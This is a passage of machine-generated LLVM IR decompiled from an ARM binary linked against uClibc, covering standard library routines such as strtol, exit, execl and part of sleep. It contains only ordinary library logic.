  store i32 %v0_13284, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_1328c = inttoptr i32 %v0_13284 to i32*
  store i32 22, i32* %v2_1328c, align 4
  %v0_13290 = call i32 @__errno_location()
  %v0_13294 = load i32, i32* %r4.global-to-local, align 4
  %v2_13294 = inttoptr i32 %v0_13290 to i32*
  store i32 %v0_13294, i32* %v2_13294, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1329c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1329c, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i1 %v7_13218, { 1, 0 }
  uselistorder i1 %v7_131f0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_1acb8.787 to i32), i32 20), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1acb8.787 to i32), { 2, 3, 1, 0 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %bb25, { 4, 3, 0, 1, 2 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_132ac = call i32 @strtol()
  ret i32 %v0_132ac
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_132b4 = call i32 @_stdlib_strto_l()
  ret i32 %v0_132b4
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_132b8 = load i32, i32* @r4, align 4
  store i32 %v3_132b8, i32* %stack_var_-36, align 4
  %v0_132bc = load i32, i32* @r1, align 4
  store i32 %v0_132bc, i32* %sb.global-to-local, align 4
  %v0_132c0 = load i32, i32* @r2, align 4
  store i32 %v0_132c0, i32* %r5.global-to-local, align 4
  %v0_132c4 = load i32, i32* @r3, align 4
  store i32 %v0_132c4, i32* %fp.global-to-local, align 4
  %v0_132c8 = load i32, i32* @r0, align 4
  %v2_132dc.pre = load i32, i32* @global_var_237ac, align 4
  br label %dec_label_pc_132d4

dec_label_pc_132d4:                               ; preds = %dec_label_pc_132d4, %entry
  %v0_1330c = phi i32 [ %v0_132c8, %entry ], [ %v1_132d0, %dec_label_pc_132d4 ]
  store i32 %v0_1330c, i32* %r4.global-to-local, align 4
  %v1_132d8 = inttoptr i32 %v0_1330c to i8*
  %v2_132d8 = load i8, i8* %v1_132d8, align 1
  %v3_132d8 = zext i8 %v2_132d8 to i32
  store i32 %v3_132d8, i32* @r2, align 4
  %v3_132e0 = mul nuw nsw i32 %v3_132d8, 2
  %v4_132e0 = add i32 %v3_132e0, %v2_132dc.pre
  %v5_132e0 = inttoptr i32 %v4_132e0 to i8*
  %v6_132e0 = load i8, i8* %v5_132e0, align 1
  %v1_132e4 = and i8 %v6_132e0, 32
  %v2_132e4 = icmp eq i8 %v1_132e4, 0
  %v1_132d0 = add i32 %v0_1330c, 1
  br i1 %v2_132e4, label %dec_label_pc_132ec, label %dec_label_pc_132d4

dec_label_pc_132ec:                               ; preds = %dec_label_pc_132d4
  %v7_132ec = icmp eq i8 %v2_132d8, 43
  br i1 %v7_132ec, label %dec_label_pc_1330c, label %dec_label_pc_132f4

dec_label_pc_132f4:                               ; preds = %dec_label_pc_132ec
  %v7_132f4 = icmp eq i8 %v2_132d8, 45
  br i1 %v7_132f4, label %dec_label_pc_1330c, label %bb

bb:                                               ; preds = %dec_label_pc_132f4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13310

dec_label_pc_1330c:                               ; preds = %dec_label_pc_132ec, %dec_label_pc_132f4
  %storemerge43 = phi i32 [ 1, %dec_label_pc_132f4 ], [ 0, %dec_label_pc_132ec ]
  store i32 %storemerge43, i32* %r7.global-to-local, align 4
  store i32 %v1_132d0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13310

dec_label_pc_13310:                               ; preds = %bb, %dec_label_pc_1330c
  %v0_13330 = phi i32 [ %v0_1330c, %bb ], [ %v1_132d0, %dec_label_pc_1330c ]
  %v1_13310 = and i32 %v0_132c0, -17
  %v3_13310 = icmp eq i32 %v1_13310, 0
  br i1 %v3_13310, label %dec_label_pc_1331c, label %bb54

bb54:                                             ; preds = %dec_label_pc_13310
  br label %bb58

dec_label_pc_1331c:                               ; preds = %dec_label_pc_13310
  %v1_1331c = inttoptr i32 %v0_13330 to i8*
  %v2_1331c = load i8, i8* %v1_1331c, align 1
  %v7_13320 = icmp eq i8 %v2_1331c, 48
  %v1_13324 = add i32 %v0_132c0, 10
  store i32 %v1_13324, i32* %r5.global-to-local, align 4
  br i1 %v7_13320, label %dec_label_pc_13330, label %bb55

bb55:                                             ; preds = %dec_label_pc_1331c
  br label %.thread8

dec_label_pc_13330:                               ; preds = %dec_label_pc_1331c
  %v1_13330 = add i32 %v0_13330, 1
  %v2_13330 = inttoptr i32 %v1_13330 to i8*
  %v3_13330 = load i8, i8* %v2_13330, align 1
  %v4_13330 = zext i8 %v3_13330 to i32
  store i32 %v1_13330, i32* %r4.global-to-local, align 4
  %v1_13334 = or i32 %v4_13330, 32
  %v7_13338 = icmp eq i32 %v1_13334, 120
  %v1_1333c = add i32 %v0_132c0, 8
  store i32 %v1_1333c, i32* %r5.global-to-local, align 4
  br i1 %v7_13338, label %bb56, label %.thread8

bb56:                                             ; preds = %dec_label_pc_13330
  %v3_13348 = mul i32 %v1_1333c, 2
  store i32 %v3_13348, i32* %r5.global-to-local, align 4
  %v2_1334c = add i32 %v0_13330, 2
  store i32 %v2_1334c, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_13330, %bb55, %bb56
  %v1_1341028 = phi i32 [ %v0_132c8, %bb55 ], [ %v1_13330, %bb56 ], [ %v1_13330, %dec_label_pc_13330 ]
  %v0_1339819 = phi i32 [ %v0_13330, %bb55 ], [ %v2_1334c, %bb56 ], [ %v1_13330, %dec_label_pc_13330 ]
  %v0_13350 = phi i32 [ %v1_13324, %bb55 ], [ %v3_13348, %bb56 ], [ %v1_1333c, %dec_label_pc_13330 ]
  %v5_13354 = icmp slt i32 %v0_13350, 16
  br i1 %v5_13354, label %bb58, label %bb57

bb57:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb58

bb58:                                             ; preds = %bb54, %.thread8, %bb57
  %v1_1341027 = phi i32 [ %v0_132c8, %bb54 ], [ %v1_1341028, %.thread8 ], [ %v1_1341028, %bb57 ]
  %v0_1339818 = phi i32 [ %v0_13330, %bb54 ], [ %v0_1339819, %.thread8 ], [ %v0_1339819, %bb57 ]
  %v0_13368 = phi i32 [ %v0_132c0, %bb54 ], [ %v0_13350, %.thread8 ], [ 16, %bb57 ]
  %v1_13358 = add i32 %v0_13368, -2
  %tmp = icmp ugt i32 %v1_13358, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_13368

.thread:                                          ; preds = %bb58
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_1340c

dec_label_pc_13368:                               ; preds = %bb58
  %v2_13370 = urem i32 -1, %v0_13368
  %v1_13380 = urem i32 %v2_13370, 256
  store i32 %v1_13380, i32* %sl.global-to-local, align 4
  %v2_13384 = udiv i32 -1, %v0_13368
  store i32 0, i32* @ip, align 4
  store i32 %v2_13384, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13398

dec_label_pc_13394:                               ; preds = %bb65, %dec_label_pc_133f4
  %v0_13394 = phi i32 [ %v1_133c4, %bb65 ], [ %v0_13394.pre, %dec_label_pc_133f4 ]
  br label %dec_label_pc_13398

dec_label_pc_13398:                               ; preds = %dec_label_pc_13368, %dec_label_pc_13394
  %v1_1341025 = phi i32 [ %v1_1341027, %dec_label_pc_13368 ], [ %v0_13394, %dec_label_pc_13394 ]
  %v0_133c4 = phi i32 [ %v0_1339818, %dec_label_pc_13368 ], [ %v0_13394, %dec_label_pc_13394 ]
  %v1_13398 = inttoptr i32 %v0_133c4 to i8*
  %v2_13398 = load i8, i8* %v1_13398, align 1
  %v3_13398 = zext i8 %v2_13398 to i32
  %v1_1339c = add nsw i32 %v3_13398, -48
  %v1_133a0 = urem i32 %v1_1339c, 256
  %v1_133a8 = or i32 %v3_13398, 32
  store i32 %v1_133a8, i32* @r2, align 4
  %tmp73 = icmp ult i32 %v1_133a0, 10
  br i1 %tmp73, label %bb60, label %dec_label_pc_133b0

dec_label_pc_133b0:                               ; preds = %dec_label_pc_13398
  %v1_133b4 = add nsw i32 %v1_133a8, -87
  store i32 %v1_133b4, i32* @r2, align 4
  %tmp74 = icmp ugt i32 %v1_133a8, 96
  br i1 %tmp74, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_133b0
  %v5_133bc = urem i32 %v1_133b4, 256
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_13398, %dec_label_pc_133b0, %bb59
  %v3_133ec = phi i32 [ %v1_133a0, %dec_label_pc_13398 ], [ 40, %dec_label_pc_133b0 ], [ %v5_133bc, %bb59 ]
  %v1_133c0 = load i32, i32* %r5.global-to-local, align 4
  %v1_133c4 = add i32 %v0_133c4, 1
  store i32 %v1_133c4, i32* %r4.global-to-local, align 4
  %v6_133c8 = icmp slt i32 %v3_133ec, %v1_133c0
  br i1 %v6_133c8, label %dec_label_pc_133cc, label %dec_label_pc_1340c.loopexit

dec_label_pc_133cc:                               ; preds = %bb60
  %v0_133cc = load i32, i32* @ip, align 4
  %v1_133cc = load i32, i32* %r8.global-to-local, align 4
  %v9_133cc = icmp eq i32 %v0_133cc, %v1_133cc
  br i1 %v9_133cc, label %.thread37, label %bb61

.thread37:                                        ; preds = %dec_label_pc_133cc
  br label %dec_label_pc_133dc

bb61:                                             ; preds = %dec_label_pc_133cc
  %v3_133cc = icmp ult i32 %v0_133cc, %v1_133cc
  br i1 %v3_133cc, label %dec_label_pc_133dc, label %dec_label_pc_133f4

dec_label_pc_133dc:                               ; preds = %bb61, %.thread37
  %v4_133e42240 = phi i32 [ 1, %.thread37 ], [ 0, %bb61 ]
  %v1_133dc = load i32, i32* %sl.global-to-local, align 4
  %v3_133dc = icmp uge i32 %v3_133ec, %v1_133dc
  %v9_133dc = icmp eq i32 %v3_133ec, %v1_133dc
  %v2_133e0 = xor i1 %v3_133dc, true
  %v3_133e0 = or i1 %v9_133dc, %v2_133e0
  br i1 %v3_133e0, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_133dc
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_133dc, %bb62
  %v4_133e4 = phi i32 [ %v4_133e42240, %dec_label_pc_133dc ], [ 0, %bb62 ]
  %v2_133e4 = xor i1 %v9_133dc, true
  %v3_133e4 = and i1 %v3_133dc, %v2_133e4
  br i1 %v3_133e4, label %bb64, label %thread-pre-split

bb64:                                             ; preds = %bb63
  %v5_133e4 = urem i32 %v4_133e4, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb63, %bb64
  %v0_133e8 = phi i32 [ %v5_133e4, %bb64 ], [ %v4_133e4, %bb63 ]
  %v2_133e8 = icmp eq i32 %v0_133e8, 0
  br i1 %v2_133e8, label %bb65, label %dec_label_pc_133f4

bb65:                                             ; preds = %thread-pre-split
  %v4_133ec = mul i32 %v0_133cc, %v1_133c0
  %v5_133ec = add i32 %v4_133ec, %v3_133ec
  store i32 %v5_133ec, i32* @ip, align 4
  br label %dec_label_pc_13394

dec_label_pc_133f4:                               ; preds = %bb61, %thread-pre-split
  %v0_133f4 = call i32 @__errno_location()
  %v0_133f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_133f8 = load i32, i32* %fp.global-to-local, align 4
  %v2_133f8 = and i32 %v1_133f8, %v0_133f8
  store i32 %v2_133f8, i32* %r7.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  %v2_13404 = inttoptr i32 %v0_133f4 to i32*
  store i32 34, i32* %v2_13404, align 4
  %v0_13394.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13394

dec_label_pc_1340c.loopexit:                      ; preds = %bb60
  %v0_1340c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1340c

dec_label_pc_1340c:                               ; preds = %.thread, %dec_label_pc_1340c.loopexit
  %v1_13410 = phi i32 [ %v1_1341025, %dec_label_pc_1340c.loopexit ], [ %v1_1341027, %.thread ]
  %v2_13410 = phi i32 [ %v0_1340c.pre, %dec_label_pc_1340c.loopexit ], [ %v0_132bc, %.thread ]
  %v2_1340c = icmp eq i32 %v2_13410, 0
  br i1 %v2_1340c, label %bb67, label %bb66

bb66:                                             ; preds = %dec_label_pc_1340c
  %v3_13410 = inttoptr i32 %v2_13410 to i32*
  store i32 %v1_13410, i32* %v3_13410, align 4
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_1340c, %bb66
  %v0_13414 = load i32, i32* %r7.global-to-local, align 4
  %v2_13414 = icmp eq i32 %v0_13414, 0
  %. = select i1 %v2_13414, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_13420 = load i32, i32* %fp.global-to-local, align 4
  %v2_13420 = icmp eq i32 %v0_13420, 0
  %v0_13444.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_13420, label %dec_label_pc_1343c, label %bb70

bb70:                                             ; preds = %bb67
  %tmp75 = icmp ugt i32 %v0_13444.pre.pre, %.
  br i1 %tmp75, label %dec_label_pc_1342c, label %dec_label_pc_1343c

dec_label_pc_1342c:                               ; preds = %bb70
  %v0_1342c = call i32 @__errno_location()
  %v2_13434 = inttoptr i32 %v0_1342c to i32*
  store i32 34, i32* %v2_13434, align 4
  %v0_13438 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13438, i32* @ip, align 4
  %v0_1343c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1343c

dec_label_pc_1343c:                               ; preds = %bb70, %bb67, %dec_label_pc_1342c
  %v0_13444.pre = phi i32 [ %v0_13444.pre.pre, %bb70 ], [ %v0_13438, %dec_label_pc_1342c ], [ %v0_13444.pre.pre, %bb67 ]
  %v0_1343c = phi i32 [ %v0_13414, %bb70 ], [ %v0_1343c.pre, %dec_label_pc_1342c ], [ %v0_13414, %bb67 ]
  %v2_1343c = icmp eq i32 %v0_1343c, 0
  br i1 %v2_1343c, label %dec_label_pc_1343c._crit_edge, label %bb71

bb71:                                             ; preds = %dec_label_pc_1343c
  %v2_13440 = sub i32 0, %v0_13444.pre
  store i32 %v2_13440, i32* @ip, align 4
  br label %dec_label_pc_1343c._crit_edge

dec_label_pc_1343c._crit_edge:                    ; preds = %dec_label_pc_1343c, %bb71
  %v0_13444 = phi i32 [ %v2_13440, %bb71 ], [ %v0_13444.pre, %dec_label_pc_1343c ]
  %v2_13448 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_13448, i32* @r4, align 4
  ret i32 %v0_13444

; uselistorder directives
  uselistorder i32 %v0_13444.pre, { 1, 0 }
  uselistorder i32 %v0_13444.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_133e4, { 1, 0 }
  uselistorder i1 %v3_133dc, { 1, 0 }
  uselistorder i32 %v1_133dc, { 1, 0 }
  uselistorder i32 %v1_133c4, { 1, 0 }
  uselistorder i32 %v1_133a0, { 1, 0 }
  uselistorder i32 %v0_13394, { 1, 0 }
  uselistorder i32 %v0_13368, { 1, 0, 2 }
  uselistorder i32 %v3_13348, { 1, 0 }
  uselistorder i32 %v1_1333c, { 1, 0, 2 }
  uselistorder i32 %v0_13330, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_132d0, { 1, 0, 2 }
  uselistorder i32 %v0_132c8, { 1, 0, 2 }
  uselistorder i32 %v0_132c0, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 7, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_1343c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1343c, { 2, 0, 1 }
  uselistorder label %bb67, { 1, 0 }
  uselistorder label %dec_label_pc_1340c, { 1, 0 }
  uselistorder label %dec_label_pc_133f4, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %bb60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13398, { 1, 0 }
  uselistorder label %dec_label_pc_13394, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13310, { 1, 0 }
  uselistorder label %dec_label_pc_1330c, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_13450 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_13450, i32* @r0, align 4
  %v1_1346c = call i32 @__pthread_return_void()
  %v1_1347c = call i32 @__pthread_return_0()
  %v2_13484 = load i32, i32* @global_var_29d64.800, align 4
  %v2_13488 = icmp eq i32 %v2_13484, 0
  br i1 %v2_13488, label %.thread1, label %bb

bb:                                               ; preds = %entry
  call void @__pseudo_branch(i32 %v2_13484)
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  store i32 %v2_13450, i32* @r0, align 4
  %v1_134a8 = call i32 @__pthread_return_void()
  store i32 %v1_134a8, i32* @r0, align 4
  %v1_134ac = call i32 @__GI___uClibc_fini(i32 %v1_134a8)
  store i32 79040, i32* @lr, align 4
  %v2_134bc = call i32 @_stdio_term()
  %v0_134c0 = load i32, i32* @r4, align 4
  %v1_134c4 = call i32 @__GI__exit(i32 %v0_134c0)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 0, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_134e4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_134e4, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_134f4 = ptrtoint i32* %stack_var_-32 to i32
  %v2_134f8 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_134f8, i32* %stack_var_-32, align 4
  br label %dec_label_pc_13504

dec_label_pc_13504:                               ; preds = %dec_label_pc_13504, %entry
  %v0_13518 = phi i32 [ %v1_13518, %dec_label_pc_13504 ], [ 0, %entry ]
  %v3_13504 = phi i32 [ %v1_1350c, %dec_label_pc_13504 ], [ %v2_134f8, %entry ]
  %v1_13508 = inttoptr i32 %v3_13504 to i32*
  %v2_13508 = load i32, i32* %v1_13508, align 4
  %v1_1350c = add i32 %v3_13504, 4
  %v2_13510 = icmp eq i32 %v2_13508, 0
  store i32 %v1_1350c, i32* %stack_var_-32, align 4
  %v1_13518 = add i32 %v0_13518, 1
  store i32 %v1_13518, i32* @lr, align 4
  br i1 %v2_13510, label %dec_label_pc_13520, label %dec_label_pc_13504

dec_label_pc_13520:                               ; preds = %dec_label_pc_13504
  %v3_13520.neg = mul i32 %v1_13518, -4
  %v1_13524.neg = add i32 %v2_134f4, -8
  %v2_13528 = add i32 %v1_13524.neg, %v3_13520.neg
  %v2_13530 = inttoptr i32 %v2_13528 to i32*
  store i32 %arg1, i32* %v2_13530, align 4
  store i32 %v2_134f8, i32* %stack_var_-32, align 4
  %v0_1353c = load i32, i32* @sp, align 4
  store i32 %v0_1353c, i32* @r1, align 4
  store i32 %v0_1353c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13544

dec_label_pc_13544:                               ; preds = %dec_label_pc_13544.dec_label_pc_13544_crit_edge, %dec_label_pc_13520
  %v1_13558 = phi i32 [ %v5_13558, %dec_label_pc_13544.dec_label_pc_13544_crit_edge ], [ %v0_1353c, %dec_label_pc_13520 ]
  %v3_13544 = phi i32 [ %v3_13544.pre, %dec_label_pc_13544.dec_label_pc_13544_crit_edge ], [ %v2_134f8, %dec_label_pc_13520 ]
  %v1_13548 = inttoptr i32 %v3_13544 to i32*
  %v2_13548 = load i32, i32* %v1_13548, align 4
  %v0_1354c = load i32, i32* @lr, align 4
  %v1_1354c = add i32 %v0_1354c, -1
  store i32 %v1_1354c, i32* @lr, align 4
  %v7_1354c = icmp eq i32 %v0_1354c, 1
  %v1_13550 = add i32 %v3_13544, 4
  store i32 %v1_13550, i32* %stack_var_-32, align 4
  %v2_13558 = add i32 %v1_13558, 4
  %v3_13558 = inttoptr i32 %v2_13558 to i32*
  store i32 %v2_13548, i32* %v3_13558, align 4
  %v4_13558 = load i32, i32* %ip.global-to-local, align 4
  %v5_13558 = add i32 %v4_13558, 4
  store i32 %v5_13558, i32* %ip.global-to-local, align 4
  br i1 %v7_1354c, label %dec_label_pc_13560, label %dec_label_pc_13544.dec_label_pc_13544_crit_edge

dec_label_pc_13544.dec_label_pc_13544_crit_edge:  ; preds = %dec_label_pc_13544
  %v3_13544.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_13544

dec_label_pc_13560:                               ; preds = %dec_label_pc_13544
  %v2_13564 = load i32, i32* @global_var_29d6c.805, align 4
  store i32 %v2_13564, i32* @r2, align 4
  %v0_13568 = call i32 @__GI_execve()
  ret i32 %v0_13568

; uselistorder directives
  uselistorder i32 %v5_13558, { 1, 0 }
  uselistorder i32 %v0_1354c, { 1, 0 }
  uselistorder i32 %v1_13518, { 0, 2, 1 }
  uselistorder i32 %v1_1350c, { 1, 0 }
  uselistorder i32 %v3_13504, { 1, 0 }
  uselistorder i32 %v2_134f8, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13578 = load i32, i32* @r4, align 4
  store i32 %v3_13578, i32* %stack_var_-20, align 4
  %v6_13578 = load i32, i32* @r5, align 4
  %v9_13578 = load i32, i32* @r6, align 4
  %v16_13578 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v2_1357c = icmp eq i32 %arg1, 0
  %v2_13580 = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_1357c, label %dec_label_pc_13704, label %dec_label_pc_13598.preheader

dec_label_pc_13598.preheader:                     ; preds = %entry
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_135a017 = add i32 %v16_13578, 124
  br label %dec_label_pc_13590

dec_label_pc_13590:                               ; preds = %dec_label_pc_13598.preheader, %dec_label_pc_13590
  %v5_135a018 = phi i32 [ %v5_135a017, %dec_label_pc_13598.preheader ], [ %v5_135a0, %dec_label_pc_13590 ]
  %v2_13594 = add i32 %v5_135a018, -136
  %v3_13594 = inttoptr i32 %v2_13594 to i32*
  store i32 0, i32* %v3_13594, align 4
  %v0_13598.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13598 = add i32 %v0_13598.pre, -1
  store i32 %v1_13598, i32* %r1.global-to-local, align 4
  %v6_13598 = icmp slt i32 %v1_13598, 0
  %v4_135a0 = mul i32 %v1_13598, 4
  %v5_135a0 = add i32 %v4_135a0, %v16_13578
  br i1 %v6_13598, label %dec_label_pc_135a8, label %dec_label_pc_13590

dec_label_pc_135a8:                               ; preds = %dec_label_pc_13590
  %v2_135a8 = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_135a8, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_135b8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_135b8, i32* %stack_var_-28, align 4
  %v0_135c0 = call i32 @__sigaddset()
  store i32 %v0_135c0, i32* %r0.global-to-local, align 4
  %v1_135c4 = load i32, i32* @r5, align 4
  %v5_135c8 = icmp slt i32 %v0_135c0, %v1_135c4
  br i1 %v5_135c8, label %dec_label_pc_1370c, label %dec_label_pc_135cc

dec_label_pc_135cc:                               ; preds = %dec_label_pc_135a8
  %v2_135cc = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_135cc, i32* @r4, align 4
  store i32 %v1_135c4, i32* %r0.global-to-local, align 4
  store i32 %v2_135a8, i32* %r1.global-to-local, align 4
  %v3_135dc = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_135dc = call i32 @__GI_sigprocmask(i32 %v1_135c4, %_TYPEDEF_sigset_t* %v3_135dc, i32 %v2_135cc)
  store i32 %v4_135dc, i32* %r0.global-to-local, align 4
  %v1_135e0 = load i32, i32* @r5, align 4
  %v9_135e0 = icmp eq i32 %v4_135dc, %v1_135e0
  br i1 %v9_135e0, label %dec_label_pc_135e8, label %dec_label_pc_1370c

dec_label_pc_135e8:                               ; preds = %dec_label_pc_135cc
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_135cc, i32* %r0.global-to-local, align 4
  %v2_135f0 = call i32 @__sigismember(i32 %v2_135cc, i32 17)
  store i32 %v2_135f0, i32* %r0.global-to-local, align 4
  %v1_135f4 = load i32, i32* @r5, align 4
  %v9_135f4 = icmp eq i32 %v2_135f0, %v1_135f4
  br i1 %v9_135f4, label %dec_label_pc_1360c.preheader, label %dec_label_pc_135e8.dec_label_pc_136d4_crit_edge

dec_label_pc_135e8.dec_label_pc_136d4_crit_edge:  ; preds = %dec_label_pc_135e8
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_136d4

dec_label_pc_1360c.preheader:                     ; preds = %dec_label_pc_135e8
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13604

dec_label_pc_13604:                               ; preds = %dec_label_pc_1360c.preheader, %dec_label_pc_13604
  %v5_1361416 = phi i32 [ %v5_135a017, %dec_label_pc_1360c.preheader ], [ %v5_13614, %dec_label_pc_13604 ]
  %v2_13608 = add i32 %v5_1361416, -136
  %v3_13608 = inttoptr i32 %v2_13608 to i32*
  store i32 0, i32* %v3_13608, align 4
  %v0_1360c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1360c = add i32 %v0_1360c.pre, -1
  store i32 %v1_1360c, i32* %r1.global-to-local, align 4
  %v6_1360c = icmp slt i32 %v1_1360c, 0
  %v4_13614 = mul i32 %v1_1360c, 4
  %v5_13614 = add i32 %v4_13614, %v16_13578
  br i1 %v6_1360c, label %dec_label_pc_1361c, label %dec_label_pc_13604

dec_label_pc_1361c:                               ; preds = %dec_label_pc_13604
  store i32 %v2_135a8, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_13624 = call i32 @__sigaddset()
  store i32 %v0_13624, i32* %r0.global-to-local, align 4
  %v1_13628 = icmp slt i32 %v0_13624, 0
  br i1 %v1_13628, label %dec_label_pc_1370c, label %dec_label_pc_13630

dec_label_pc_13630:                               ; preds = %dec_label_pc_1361c
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_1363c = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_13580)
  store i32 %v4_1363c, i32* %r0.global-to-local, align 4
  %v1_13640 = icmp slt i32 %v4_1363c, 0
  br i1 %v1_13640, label %dec_label_pc_13648, label %dec_label_pc_13670

dec_label_pc_13648:                               ; preds = %dec_label_pc_13630
  %v0_13648 = call i32 @__errno_location()
  store i32 %v2_135cc, i32* %r1.global-to-local, align 4
  store i32 %v0_13648, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_1365c = inttoptr i32 %v0_13648 to i32*
  %v2_1365c = load i32, i32* %v1_1365c, align 4
  store i32 %v2_1365c, i32* @r4, align 4
  %v3_13660 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_13660 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_13660, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_13668 = load i32, i32* @r4, align 4
  %v1_13668 = load i32, i32* %r5.global-to-local, align 4
  %v2_13668 = inttoptr i32 %v1_13668 to i32*
  store i32 %v0_13668, i32* %v2_13668, align 4
  %v17_13714.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13710

